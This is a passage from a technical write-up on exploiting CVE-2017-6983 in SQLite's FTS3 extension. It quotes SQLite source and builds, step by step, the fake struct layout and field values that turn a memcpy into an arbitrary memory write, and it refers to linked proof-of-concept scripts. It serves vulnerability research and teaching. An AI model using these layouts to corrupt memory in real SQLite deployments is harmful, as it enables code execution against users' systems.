
Now we are going to enter `sqlite3_fianlize` function, with `pStmt` as the only argument. `pStmt` comes from `p->pStmt`. Here, this `p` points to the `Incrblob` structure. We may need to set `Incrblob.pStmt` later.

```c
 87424 /*
 87425 ** The following routine destroys a virtual machine that is created by
 87426 ** the sqlite3_compile() routine. The integer returned is an SQLITE_
 87427 ** success/failure code that describes the result of executing the virtual
 87428 ** machine.
 87429 **
 87430 ** This routine sets the error code and string returned by
 87431 ** sqlite3_errcode(), sqlite3_errmsg() and sqlite3_errmsg16().
 87432 */
 87433 SQLITE_API int sqlite3_finalize(sqlite3_stmt *pStmt){
 87434   int rc;
 87435   if( pStmt==0 ){
 87436     /* IMPLEMENTATION-OF: R-57228-12904 Invoking sqlite3_finalize() on a NULL
 87437     ** pointer is a harmless no-op. */
 87438     rc = SQLITE_OK;
 87439   }else{
 87440     Vdbe *v = (Vdbe*)pStmt;
 87441     sqlite3 *db = v->db;
 87442     if( vdbeSafety(v) ) return SQLITE_MISUSE_BKPT;
 87443     sqlite3_mutex_enter(db->mutex);
 87444     checkProfileCallback(db, v);
 87445     assert( v->eVdbeState>=VDBE_READY_STATE );
 87446     rc = sqlite3VdbeReset(v);
 87447     sqlite3VdbeDelete(v);
 87448     rc = sqlite3ApiExit(db, rc);
 87449     sqlite3LeaveMutexAndCloseZombie(db);
 87450   }
 87451   return rc;
 87452 }
```

If we set `pStmt` to `0`, the whole function call will immediately return. However, we have not achieved arbitrary memory write, so we cannot make it zero.

Instead, we need to make `pStmt` point to a `Vdbe` structure based on line `87440`. Within the `Vdbe` structure, we need to set `db` to point to a `sqlite3`. Here, we reuse the previous `sqlite3` structure to reduce the footprint. However, if there is any conflict, we will need to come back and create a seperate `sqlite3`.

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# + Vdbe (0x138)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob_metadata = 0
Incrblob.db = &sqlite3
sqlite3.mutex = 0
sqlite3.lookaside.pEnd = 0
sqlite3.pnBytesFreed = &nBytesFreed
sqlite3.lookaside.pTrueEnd = 0
+ Incrblob.pStmt = &Vdbe
+ Vdbe.db = &sqlite3
```

```c
 87373 static int vdbeSafety(Vdbe *p){
 87374   if( p->db==0 ){
 87375     sqlite3_log(SQLITE_MISUSE, "API called with finalized prepared statement");
 87376     return 1;
 87377   }else{
 87378     return 0;
 87379   }
 87380 }
```

`vdbeSatefy` merely checks its `db` member, so we have fixed it by pointing to a real (fake) `sqlite` structure.

```c
 87414 /*
 87415 ** The checkProfileCallback(DB,P) macro checks to see if a profile callback
 87416 ** is needed, and it invokes the callback if it is needed.
 87417 */
 87418 # define checkProfileCallback(DB,P) \
 87419    if( ((P)->startTime)>0 ){ invokeProfileCallback(DB,P); }
 87420 #else
 87421 # define checkProfileCallback(DB,P)  /*no-op*/
 87422 #endif
```

We need to set `Vdbe.startTime` to 0 to avoid invoking `invokeProfileCallback`. Also, need to set `Vdbe.eVdbeState = 1` to bypass the `assert` at line 87745.

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe (0x138)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob_metadata = 0
Incrblob.db = &sqlite3
sqlite3.mutex = 0
sqlite3.lookaside.pEnd = 0
sqlite3.pnBytesFreed = &nBytesFreed
sqlite3.lookaside.pTrueEnd = 0
Incrblob.pStmt = &Vdbe
Vdbe.db = &sqlite3
+ Vdbe.startTime = 0
+ Vdbe.eVdbeState = 1
```

### 11. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3_finalize > sqlite3VdbeReset

Now we enter `sqlite3VdbeReset`. This function is long and complex, so we will take time to analyze it.

```c
 85436   if( p->eVdbeState==VDBE_RUN_STATE ) sqlite3VdbeHalt(p);
```

We have set `eVdbeState` to `VDBE_READY_STATE`, not `VDBE_RUN_STATE`.

```c
 85438   /* If the VDBE has been run even partially, then transfer the error code
 85439   ** and error message from the VDBE into the main database structure.  But
 85440   ** if the VDBE has just been set to run but has not actually executed any
 85441   ** instructions yet, leave the main database error information unchanged.
 85442   */
 85443   if( p->pc>=0 ){
 85444     vdbeInvokeSqllog(p);
 85445     if( db->pErr || p->zErrMsg ){
 85446       sqlite3VdbeTransferError(p);
 85447     }else{
 85448       db->errCode = p->rc;
 85449     }
 85450   }
```

Here we want the execution go into `sqlite3VbdeTransferError`, so we make `p->pc = 0`. Meanwhile, we make `db-pErr` point to a valid `sqlite3_value` structure, and make `p->zErrMsg` to a temporary pointer, say the same as `base`.

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe (0x138)
# + sqlite3_value (0x48)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob_metadata = 0
Incrblob.db = &sqlite3
sqlite3.mutex = 0
sqlite3.lookaside.pEnd = 0
sqlite3.pnBytesFreed = &nBytesFreed
sqlite3.lookaside.pTrueEnd = 0
Incrblob.pStmt = &Vdbe
Vdbe.db = &sqlite3
Vdbe.startTime = 0
Vdbe.eVdbeState = 1
+ Vdbe.pc = 0
+ Vdbe.zErrMsg = &Fts3Cursor (temporary)
+ sqlite3.pErr = &sqlite3_value
```

After this setting, we are ready to invoke `sqlite3VdbeTransferError`.

### 12. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3_finalize > sqlite3VdbeReset > sqlite3VdbeTransferError

```c
 85367 ** Copy the error code and error message belonging to the VDBE passed
 85368 ** as the first argument to its database handle (so that they will be
 85369 ** returned by calls to sqlite3_errcode() and sqlite3_errmsg()).
 85370 **
 85371 ** This function does not clear the VDBE error code or message, just
 85372 ** copies them to the database handle.
 85373 */
 85374 SQLITE_PRIVATE int sqlite3VdbeTransferError(Vdbe *p){
 85375   sqlite3 *db = p->db;
 85376   int rc = p->rc;
 85377   if( p->zErrMsg ){
 85378     db->bBenignMalloc++;
 85379     sqlite3BeginBenignMalloc();
 85380     if( db->pErr==0 ) db->pErr = sqlite3ValueNew(db);
 85381     sqlite3ValueSetStr(db->pErr, -1, p->zErrMsg, SQLITE_UTF8, SQLITE_TRANSIENT);
 85382     sqlite3EndBenignMalloc();
 85383     db->bBenignMalloc--;
 85384   }else if( db->pErr ){
 85385     sqlite3ValueSetNull(db->pErr);
 85386   }
 85387   db->errCode = rc;
 85388   db->errByteOffset = -1;
 85389   return rc;
 85390 }
```

* At line 85377, `p->zErrMsg` is not `NULL`, so we will enter the `if` block.
* At line 85380, `db->pErr` is not `NULL`, so we skip the allocation.

We are ready to enter function `sqlite3ValueSetStr`.

### 13. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3_finalize > sqlite3VdbeReset > sqlite3VdbeTransferError > sqlite3ValueSetStr

```c
 81958 SQLITE_PRIVATE void sqlite3ValueSetStr(
 81959   sqlite3_value *v,     /* Value to be set */
 81960   int n,                /* Length of string z */
 81961   const void *z,        /* Text of the new string */
 81962   u8 enc,               /* Encoding to use */
 81963   void (*xDel)(void*)   /* Destructor for the string */
 81964 ){
 81965   if( v ) sqlite3VdbeMemSetStr((Mem *)v, z, n, enc, xDel);
 81966 }
```

The code here is very simple. Since `v`, which is `db->pErr` is not `NULL`, we will enter function `sqlite3VdbeMemSetStr`.

### 14. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3_finalize > sqlite3VdbeReset > sqlite3VdbeTransferError > sqlite3ValueSetStr > sqlite3VdbeMemSetStr

This function is also complex. However, the overall function is like a `memcpy(dst, src, n)`

There are a few extra constraints needed to be fixed.

Constraints in this function:

* `sqlite3_value.db` should be 0 to bypass an assert check at line 81169.

Constraints in function `sqlite3VdbeMemClearAndResize`.

* `sqlite3_value.szMalloc` should be larger than 0x20; make it `0x100` to simplify the task
* `sqlite3_value.flags & MEM_Dyn` should be `0`, so just set the `flags` to 0
* `sqlite3_value.zMalloc` is copied to `sqlite3_value.z`. This is the destination pointer.


```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe (0x138)
# sqlite3_value (0x48)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob_metadata = 0
Incrblob.db = &sqlite3
sqlite3.mutex = 0
sqlite3.lookaside.pEnd = 0
sqlite3.pnBytesFreed = &nBytesFreed
sqlite3.lookaside.pTrueEnd = 0
Incrblob.pStmt = &Vdbe
Vdbe.db = &sqlite3
Vdbe.startTime = 0
Vdbe.eVdbeState = 1
Vdbe.pc = 0
Vdbe.zErrMsg = &Fts3Cursor (temporary)
sqlite3.pErr = &sqlite3_value
+ sqlite3_value.db = 0
+ sqlite3_value.szMalloc = 0x100
+ sqlite3_value.flags = 0
+ sqlite3_value.zMalloc = 0xdeadbeef
```

Once this setting is done, we will reach the following line in `sqlite3VdbeMemSetStr`, which is exactly a call to `memcpy`.

```c
 81225     memcpy(pMem->z, z, nAlloc);
```

At this moment, we finally achieve arbitrary memory write, from any location, to any location.

### 15. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3_finalize > sqlite3VdbeReset

The execution will return back to `sqlite3VdbeReset` at line 85447.

```c
 85429   sqlite3 *db;
 85430   db = p->db;
 ...     ...
 85443   if( p->pc>=0 ){
 85444     vdbeInvokeSqllog(p);
 85445     if( db->pErr || p->zErrMsg ){
 85446       sqlite3VdbeTransferError(p);
 85447     }else{
 85448       db->errCode = p->rc;
 85449     }
 85450   }
 ...
 85457   if( p->apCsr ) ...
 85458   if( p->aMem ){
 85459     ...
 85460   }
 85461
 85462   if( p->zErrMsg ){
 85463     sqlite3DbFree(db, p->zErrMsg);
 85464     p->zErrMsg = 0;
 85465   }
 ...     ... // note: VDBE_PROFILE is false
 85506   return p->rc & db->errMask;
 85507 }
```

We need to set `p->apCsr`, `p->aMem` to 0. `p->zErrMsg` is not `NULL` so the execution will go into `sqlite3DbFree`. We do not have to worry about it, since we have set up a proper `sqlite` before and reuse it for this `db`.

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe (0x138)
# sqlite3_value (0x48)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob_metadata = 0
Incrblob.db = &sqlite3
sqlite3.mutex = 0
sqlite3.lookaside.pEnd = 0
sqlite3.pnBytesFreed = &nBytesFreed
sqlite3.lookaside.pTrueEnd = 0
Incrblob.pStmt = &Vdbe
Vdbe.db = &sqlite3
Vdbe.startTime = 0
Vdbe.eVdbeState = 1
Vdbe.pc = 0
Vdbe.zErrMsg = src_ptr
sqlite3.pErr = &sqlite3_value
sqlite3_value.szMalloc = 0x100
sqlite3_value.flags = 0
sqlite3_value.zMalloc = dst_ptr
+ Vdbe.apCsr = 0
+ Vdbe.aMem = 0
```
OK, we are good to return now, returning to line 87447 within function `sqlite3_finalize`.

```c
 87433 SQLITE_API int sqlite3_finalize(sqlite3_stmt *pStmt){
 87434   int rc;
 87435   if( pStmt==0 ){
 87436     /* IMPLEMENTATION-OF: R-57228-12904 Invoking sqlite3_finalize() on a NULL
 87437     ** pointer is a harmless no-op. */
 87438     rc = SQLITE_OK;
 87439   }else{
 87440     Vdbe *v = (Vdbe*)pStmt;
 87441     sqlite3 *db = v->db;
 87442     if( vdbeSafety(v) ) return SQLITE_MISUSE_BKPT;
 87443     sqlite3_mutex_enter(db->mutex);
 87444     checkProfileCallback(db, v);
 87445     assert( v->eVdbeState>=VDBE_READY_STATE );
 87446     rc = sqlite3VdbeReset(v);
>87447     sqlite3VdbeDelete(v);
 87448     rc = sqlite3ApiExit(db, rc);
 87449     sqlite3LeaveMutexAndCloseZombie(db);
 87450   }
 87451   return rc;
 87452 }
```

The execution will go through multiple functions, with some extra constraints.

```txt
#----------------------------------------------------------
# expected layout:

# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe_metadata (0x8)
# Vdbe (0x138)
# sqlite3_value (0x48)
# malicious metadata (0x8)
# malicious value/string (?)

#----------------------------------------------------------
# required type.member values:

# Fts3Cursor.base.pVtable = &Fts3Table  (line 182454 @ fts3OptimizeFunc)
# Fts3Table.db = 0                      (line 34895 @ sqlite3SafetyCheckOk)
# Fts3Table.pSegments = &Incrblob       (line 98925 @ sqlite3_blob_close)
# Incrblob_metadata = 0                 (due to malloc_usable_size)
# Incrblob.db = &sqlite3                (line 98931 @ sqlite3_blob_close)
# sqlite3.mutex = 0                     (line 98932 @ sqlite3_blob_close)
# sqlite3.lookaside.pEnd = 0            (line 29361 @ sqlite3DbFreeNN)
# sqlite3.pnBytesFreed = &nBytesFreed   (line 29385 @ sqlite3DbFreeNN)
# sqlite3.lookaside.pTrueEnd = 0        (line 29305 @ isqlite3DbMallocSize)
# Incrblob.pStmt = &Vdbe                (line 87440 @ sqlite3_finalize)
# Vdbe_metadata = 0                     (due to malloc_usable_size)
# Vdbe.db = &sqlite3                    (line 87441 @ sqlite3_finalize)
# Vdbe.startTime = 0                    (line 87444 @ sqlite3_finalize)
# Vdbe.eVdbeState = 1                   (line 87445 @ sqlite3_finalize)
# Vdbe.pc = 0                           (line 85443 @ sqlite3VdbeReset)
# Vdbe.zErrMsg = src_ptr                (line 85445 @ sqlite3VdbeReset)
# sqlite3.pErr = &sqlite3_value         (line 85445 @ sqlite3VdbeReset)
# sqlite3_value.db = 0                  (line 81169 @ sqlite3VdbeMemSetStr)
# sqlite3_value.flags = 0               (line 80323 @ sqlite3VdbeMemClearAndResize)
# sqlite3_value.szMalloc = 0x100        (line 80324 @ sqlite3VdbeMemClearAndResize)
# sqlite3_value.zMalloc = dst_ptr       (line 80328 @ sqlite3VdbeMemClearAndResize)
# Vdbe.apCsr = 0                        (line 85457 @ sqlite3VdbeReset)
# Vdbe.aMem = 0                         (line 85458 @ sqlite3VdbeReset)
# Vdbe.aColName = 0                     (line 85574 @ sqlite3VdbeClearObject)
# Vdbe.pProgram = 0                     (line 85578 @ sqlite3VdbeClearObject)
# Vdbe.aVar = 0                         (line 85584 @ sqlite3VdbeClearObject)
# Vdbe.pVList = 0                       (line 85585 @ sqlite3VdbeClearObject)
# Vdbe.pFree = 0                        (line 85586 @ sqlite3VdbeClearObject)
# Vdbe.aOp = 0                          (line 85588 @ sqlite3VdbeClearObject)
# Vdbe.nOp = 0                          (line 85588 @ sqlite3VdbeClearObject)
# Vdbe.zSql = 0                         (line 85589 @ sqlite3VdbeClearObject)
# malicious_metadata = 0                (due to malloc_usable_size)
# malicious_content = Your-bad-value
```


We can luckily keep returning, until we reach back to the very first function `fts3OptimizeFunc`

### 16. sqlite3Fts3Optimize

```c
 182457   rc = sqlite3Fts3Optimize(p);
 182458
>182459   switch( rc ){
 182460     case SQLITE_OK:
 182461       sqlite3_result_text(pContext, "Index optimized", -1, SQLITE_STATIC);
 182462       break;
 182463     case SQLITE_DONE:
 182464       sqlite3_result_text(pContext, "Index already optimal", -1, SQLITE_STATIC);
 182465       break;
 182466     default:
 182467       sqlite3_result_error_code(pContext, rc);
 182468       break;
 182469   }
 182470 }
```

`rc` here comes from `sqlite3Fts3Optimize`, where we have intensionally failed `sqlite3_exec`, which makes `rc` 0x15 -- `SQLITE_MISUSE`. If we just let SQLite continue, it will report an error on the terminal.

```bash
Runtime error near line 5: bad parameter or other API misuse (21)
```

This is OK since it does not stop the execution of more SQL queries.

# At the end

We have completed the construction of a write-what-where primitive. The complete PoC is available at [cve-2017-6983-poc.py](./cve-2017-6983-poc.py).

Note that we can remove all corruptions to `0` since in our initial malicious BLOB data, the content is almost all `0`. Therefore, the layout and required changes can be reduced to a simple version.


```txt
#----------------------------------------------------------
# expected layout:

# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe_metadata (0x8)
# Vdbe (0x138)
# sqlite3_value (0x48)
# malicious metadata (0x8)
# malicious value/string (?)

#----------------------------------------------------------
# required type.member values:

# Fts3Cursor.base.pVtable = &Fts3Table  (line 182454 @ fts3OptimizeFunc)
# Fts3Table.pSegments = &Incrblob       (line 98925 @ sqlite3_blob_close)
# Incrblob.db = &sqlite3                (line 98931 @ sqlite3_blob_close)
# sqlite3.pnBytesFreed = &nBytesFreed   (line 29385 @ sqlite3DbFreeNN)
# Incrblob.pStmt = &Vdbe                (line 87440 @ sqlite3_finalize)
# Vdbe.db = &sqlite3                    (line 87441 @ sqlite3_finalize)
# Vdbe.eVdbeState = 1                   (line 87445 @ sqlite3_finalize)
# Vdbe.zErrMsg = src_ptr                (line 85445 @ sqlite3VdbeReset)
# sqlite3.pErr = &sqlite3_value         (line 85445 @ sqlite3VdbeReset)
# sqlite3_value.szMalloc = 0x100        (line 80324 @ sqlite3VdbeMemClearAndResize)
# sqlite3_value.zMalloc = dst_ptr       (line 80328 @ sqlite3VdbeMemClearAndResize)
# malicious_content = Your-bad-value
```


The simplified PoC is available at [cve-2017-6983-poc-simple.py](./cve-2017-6983-poc-simple.py).